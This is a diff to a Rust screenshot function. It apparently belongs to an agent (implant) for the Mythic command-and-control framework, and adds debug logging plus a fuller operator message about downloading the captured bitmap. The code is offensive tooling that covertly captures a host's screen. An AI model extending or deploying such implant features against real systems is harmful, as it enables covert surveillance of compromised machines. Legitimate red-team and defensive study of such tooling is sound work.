@@ -56,6 +56,9 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
         let filename = format!("screenshot_{}.bmp", timestamp);
         let screenshot_path = std::env::temp_dir().join(&filename);
         
+        // Debug: Print the full path where screenshot will be saved
+        eprintln!("DEBUG: Screenshot will be saved to: {}", screenshot_path.to_string_lossy());
+        
         save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path)?;
 
         // Cleanup
@@ -66,12 +69,19 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
         // Read BMP bytes for size info
         let screenshot_data = fs::read(&screenshot_path)?;
 
+        // Debug: Confirm file was saved and show details
+        eprintln!("DEBUG: Screenshot saved successfully!");
+        eprintln!("DEBUG: File path: {}", screenshot_path.to_string_lossy());
+        eprintln!("DEBUG: File size: {} bytes", screenshot_data.len());
+        eprintln!("DEBUG: File exists: {}", screenshot_path.exists());
+
         Ok(mythic_success!(
             task.id,
             format!(
-                "Screenshot saved to: {}\nFile size: {} bytes\nYou can download it using: download {}",
+                "Screenshot saved successfully!\n\nFile Details:\n- Path: {}\n- Size: {} bytes\n- Exists: {}\n\nTo download to Mythic, use:\ndownload {}",
                 screenshot_path.to_string_lossy(),
                 screenshot_data.len(),
+                screenshot_path.exists(),
                 screenshot_path.to_string_lossy()
             )
         ))
@@ -83,6 +93,8 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
 unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &std::path::Path) -> Result<(), Box<dyn Error>> {
     use std::fs::File;
     use std::io::Write;
+
+    eprintln!("DEBUG: Creating BMP file at: {}", path.to_string_lossy());
 
     let mut bmp_file_header = BITMAPFILEHEADER {
         bfType: 0x4D42, // 'BM'
@@ -113,6 +125,9 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
 
     bmp_file_header.bfSize = bmp_file_header.bfOffBits + image_size;
 
+    eprintln!("DEBUG: BMP dimensions: {}x{}", width, height);
+    eprintln!("DEBUG: BMP image size: {} bytes", image_size);
+
     let mut buffer = vec![0u8; image_size as usize];
     let hdc = GetDC(ptr::null_mut());
     GetDIBits(
@@ -136,6 +151,7 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
 
     // Write BMP to file manually without bytemuck
     let mut file = File::create(path)?;
+    eprintln!("DEBUG: BMP file created successfully");
     
     // Write BITMAPFILEHEADER
     file.write_all(&bmp_file_header.bfType.to_le_bytes())?;
@@ -159,6 +175,10 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
     
     // Write pixel data
     file.write_all(&buffer)?;
+    
+    eprintln!("DEBUG: BMP file written successfully, total size: {} bytes", 
+        bmp_file_header.bfOffBits + image_size);
+    
     Ok(())
 }
 
